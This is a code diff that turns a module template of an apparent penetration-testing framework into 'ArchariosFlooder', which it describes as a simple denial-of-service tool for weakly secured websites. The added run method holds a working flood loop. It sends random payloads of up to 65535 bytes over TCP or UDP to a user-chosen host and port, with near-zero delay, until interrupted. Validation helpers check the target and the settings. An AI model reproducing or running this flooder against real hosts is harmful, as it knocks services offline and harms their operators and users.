@@ -10,8 +10,12 @@ from core import exceptions
 
 # Put all needed dependencies here!
 try:
-    # import something_here
-    pass
+    import time
+    import socket
+    import requests
+    from core import gethost
+    from core import printer
+    from core import asciigraphs
 
 except BaseException as err:
     print("While importing dependency modules, an error occured: {0}".format(str(err)))
@@ -26,7 +30,12 @@ Template for creating a module for Archários Framework.
 
 # Put all objects here that needs to be tested.
 objects = ["ArchariosFrameworkModule", "ArchariosFrameworkModule.__init__",
-        "ArchariosFrameworkModule.prepare", "ArchariosFrameworkModule.run"]
+        "ArchariosFrameworkModule.prepare", "ArchariosFrameworkModule.run",
+        "ArchariosFrameworkModule.validate_attack_mode",
+        "ArchariosFrameworkModule.validate_protocol",
+        "ArchariosFrameworkModule.validate_port_number",
+        "ArchariosFrameworkModule.validate_target",
+        "ArchariosFrameworkModule.get_socket_obj"]
 
 
 class ArchariosFrameworkModule:
@@ -47,81 +56,27 @@ class ArchariosFrameworkModule:
         # NOTE: DEV0004: Modify THIS DICTIONARY ONLY!
         self.module_info = {
                 # Module name
-                "name": "<MODULE_NAME>",
+                "name": "ArchariosFlooder",
                 # Module brief description
-                "bdesc": "<BRIEF_DESCRIPTION>",
+                "bdesc": "A simple Denial-of-Service Tool.",
                 # Module version
-                "version": 1.0,
+                "version": 1.1,
                 # Module author
-                "author": "<MODULE_AUTHOR>",
+                "author": "Catayao56",
                 # Module status
                 "status": "Stable",
                 # Date created (Please follow the format)
-                "created": "<DATE_CREATED>",
+                "created": "Aug. 12 2018",
                 # Latest update (Please follow the format)
-                "last_update": "<DATE_CREATED>",
+                "last_update": "Aug. 12 2018",
                 # Long description
                 "ldesc": """\
-<t>This module is meantly built for Archários Framework.<end>
+<t>Archarios Flooder<end> :: <b>A simple Denial-of-Service Tool.<end>
 
-This module can be a template for contributors if they
-want to create their own module.
+<u>Archarios Flooder<end> is a simple DoS (Denial-of-Service) tool
+that you can use for website with low bandwidth and security.
 
-When creating a new module, <u>please read CONTRIBUTING.md<end>
-for guidelines on creating a module, and
-<u>CODE_OF_CONDUCT.md<end> for rules regarding to a
-harassment-free experience.
-
-<h>Formatting tutorial<end>:
-    <n>NOTE<end>: <u>This applies to long descriptions (ldesc variable).<end>
-
-    To highlight the title, use the `< t >` expression
-    (without the spaces between `<` and `t`, `t` and `>`.)
-
-    Example:
-             <t>This is a title.<end>
-
-    To highlight a subtitle, use the `< h >` expression
-    (without the spaces between `<` and `h`, `h` and `>`.)
-
-    Example:
-             <h>This is a subtitle.<end>
-
-    To format strings, use the following:
-        `< u >` to underline text,
-        `< i >` to italicize text, and
-        `< b >` to bold text.
-
-        (without the spaces!)
-
-    Example:
-             <u>Underlined<end>
-             <i>Italicized<end>
-             <b>Bold<end>
-
-    To place a note, use the `< n >` expression
-    (without the spaces between `<` and `n`, `n` and `>`.)
-
-    Example:
-             <n>This is a Note. Follow the guidelines when creating a module!<end>
-
-    Remember to put `< end >` expression after the characters you
-    want to be modified.
-
-    Example:
-             <t>This is a title,<end> and this is not.
-             <h>This is a subtitle,<end> and this is not.
-             <u>This is underlined,<end> and this is not.
-             <i>This is italic,<end> and this is not.
-             <b>This is bold,<end> and this is not.
-             <n>This is a note,<end> and this is not.
-
-             <t>F<end> <h>A<end> <u>N<end> <i>C<end> <b>Y<end> <n>!<end>
-
-<h>Module Template Version History<end>
-    1.0: Initial Release.
-    1.1: Added version history on show_module_info() method.
-
+It is very customizeable so it can suit your needs.
              """.replace('<t>', misc.FB + misc.FU + misc.FI).replace(
                  '<end>', misc.END).replace('<u>', misc.FU).replace(
                  '<i>', misc.FI).replace('<b>', misc.FB).replace(
@@ -132,7 +87,8 @@ harassment-free experience.
         # NOTE: DEV0004: Modify THIS DICTIONARY ONLY!
         # Update history
         self.version_history = {
-                    1.0: "Initial update"
+                    1.0: "Initial update",
+                    1.1: "Default attack added."
                     }
 
         self._parse_module_info()
@@ -335,13 +291,26 @@ harassment-free experience.
         # Format: key + default_value
                 # Example: "target": "192.168.0.1"
         values = {
-                # This can be none, it is allowed.
+                "target": "localhost",
+                "port": 0,
+                "protocol": "tcp",
+                "attack_mode": "default",
+                "timeout": 0.01,
+                "packet_size": 2048,
+                # "post_data": ""
                 }
 
         # Format: key + info
                 # Example: "target": "The target to test."
         vhelp = {
-                # This can be none, it is allowed.
+                "target": "The target machine to attack.",
+                "port": "Port of the target machine to attack.",
+                "protocol": "Protocol to use: `tcp` or `udp`",
+                "attack_mode": "Attack mode to use; must be `default`, \
+`arp`, `dhcp` or `web`. (`show info` for more info.)",
+                "timeout": "Grace period for every connection attempts.",
+                "packet_size": "Packet to send (When attack_mode is `default`.)",
+                # "post_data": "POST data to send with the request."
                 }
 
         return values, vhelp
@@ -358,8 +327,159 @@ harassment-free experience.
         # NOTE: DEV0004: This is the method you will work on!
 
         if self.from_API is True:
-            return((0, "Hello, world!"))
+            return (0, [error.ErrorCodes().ERROR0005().split('\n')])
 
         else:
-            print("Hello, world!")
-            return 0
+            if self.validate_attack_mode(values['attack_mode'],
+                    values['packet_size']) is False:
+                return 1
+
+            if self.validate_protocol(values['protocol']) is False:
+                return 2
+
+            if self.validate_port_number(values['port']) is False:
+                return 3
+
+            if self.validate_target(values['target'], values['port'], \
+                    values['attack_mode'], values['protocol']) is False:
+                return 4
+
+            printer.Printer().print_with_status("Press enter to start attack!", 1)
+            input()
+            printer.Printer().print_with_status("Starting attack!", 0)
+            print(misc.CGR + "[i] Press CTRL+C or CTRL+D to stop attack." + misc.END)
+            if values['attack_mode'].lower() == 'default':
+                while True:
+                    try:
+                        try:
+                            conn = self.get_socket_obj(values['protocol'])
+                            conn.connect((values['target'], values['port']))
+                            conn.sendall(random._urandom(values['packet_size']))
+                            time.sleep(values['timeout'])
+
+                        except(KeyboardInterrupt, EOFError):
+                            printer.Printer().print_with_status("Attack stopped.", 1)
+                            return 0
+
+                        except BaseException as err:
+                            printer.Printer().print_with_status(str(err), 2)
+
+                    except(KeyboardInterrupt, EOFError):
+                        printer.Printer().print_with_status("Attack stopped.", 1)
+                        return 0
+
+            else:
+                printer.Printer().print_with_status("Invalid attack_mode!", 2)
+                return 5
+
+    def validate_attack_mode(self, attack_mode, packet_size):
+        printer.Printer().print_with_status("Validating attack_mode...", 0)
+        if attack_mode.lower() in ('default', 'arp', 'dhcp', 'web'):
+            if attack_mode.lower() in ('default', 'arp', 'dhcp'):
+                if type(packet_size) is not int:
+                    printer.Printer().print_with_status("Invalid packet_size! Aborting attack.", 2)
+                    return False
+
+                if packet_size < 1 or packet_size > 65535:
+                    printer.Printer().print_with_status("Invalid packet_size! Aborting attack.", 2)
+                    return False
+
+            else:
+                pass
+
+            return True
+
+        else:
+            printer.Printer().print_with_status("Invalid attack_mode! Aborting attack.", 2)
+            return False
+
+    def validate_protocol(self, protocol):
+        printer.Printer().print_with_status("Validating protocol...", 0)
+        if protocol.lower() in ('tcp', 'udp'):
+            return True
+
+        else:
+            printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
+            return False
+
+    def validate_port_number(self, port):
+        if type(port) is not int:
+            printer.Printer().print_with_status("Port must be an integer!", 2)
+            return False
+
+        else:
+            if port < 1 or port > 65535:
+                printer.Printer().print_with_status("Port must be 1~65535 only!", 2)
+                return False
+
+            else:
+                return True
+
+    def validate_target(self, target, port, attack_mode, protocol):
+        """
+        def validate_target():
+            Check if target is valid.
+        """
+
+        printer.Printer().print_with_status("Trying to connect to \
+``{0}``...".format(target), 0)
+        if attack_mode.lower() in ('default', 'arp', 'dhcp'):
+            try:
+                conn = self.get_socket_obj(protocol)
+                conn.connect((target, port))
+                conn.close()
+
+            except BaseException as err:
+                printer.Printer().print_with_status(str(err), 2)
+                return False
+
+            else:
+                return True
+
+        elif attack_mode.lower() in ('web',):
+            print("[01] HTTP")
+            print("[02] HTTPS")
+            print()
+            while True:
+                try:
+                    schema = int(input("What schema will we use? > "))
+                    if schema == 1:
+                        schema = 'http://'
+                        break
+
+                    elif schema == 2:
+                        schema = 'https://'
+                        break
+
+                    else:
+                        continue
+
+                except(ValueError, TypeError, EOFError, KeyboardInterrupt):
+                    continue
+
+            try:
+                response = requests.get(schema + target + ':' + str(port))
+
+            except BaseException as err:
+                printer.Printer().print_with_status(str(err), 2)
+                return False
+
+        else:
+            printer.Printer().print_with_status("Unknown attack_mode! Aborting attack.", 2)
+            return False
+
+    def get_socket_obj(self, protocol):
+        """
+        def get_socket_obj():
+            Return a socket object to use.
+        """
+
+        if protocol.lower() == 'tcp':
+            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        elif protocol.lower() == 'udp':
+            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        else:
+            printer.Printer().print_with_status("Invalid protocol! Aborting attack.", 2)
+            raise exceptions.InvalidParameterError()
